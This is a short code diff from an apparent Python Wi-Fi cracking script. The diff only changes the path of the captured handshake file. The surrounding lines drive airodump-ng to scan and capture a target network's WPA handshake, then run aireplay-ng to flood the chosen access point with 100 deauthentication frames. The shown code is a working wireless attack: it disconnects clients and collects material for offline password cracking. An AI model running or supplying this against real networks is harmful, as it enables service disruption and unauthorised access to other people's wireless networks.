@@ -17,7 +17,7 @@ def main():
     run_command(["qterminal", "--title", "scan", "-e", "airodump-ng", "wlan0"], wait=False)
     bssid = input("BSSID?: ")
     channel = input("Channel?: ")
-    run_command(["qterminal", "--title", "handshake", "-e", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "WPA/wificrack.cap", "wlan0", "--ignore-negative-one"], wait=False)
+    run_command(["qterminal", "--title", "handshake", "-e", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "MISC/WPA/wificrack.cap", "wlan0", "--ignore-negative-one"], wait=False)
     run_command(["qterminal", "--title", "aireplay-ng", "-e", "aireplay-ng", "--deauth", "100", "-a", bssid, "wlan0", "--ignore-negative-one"])
     print("Press Ctrl+C if you are ready")
     try:
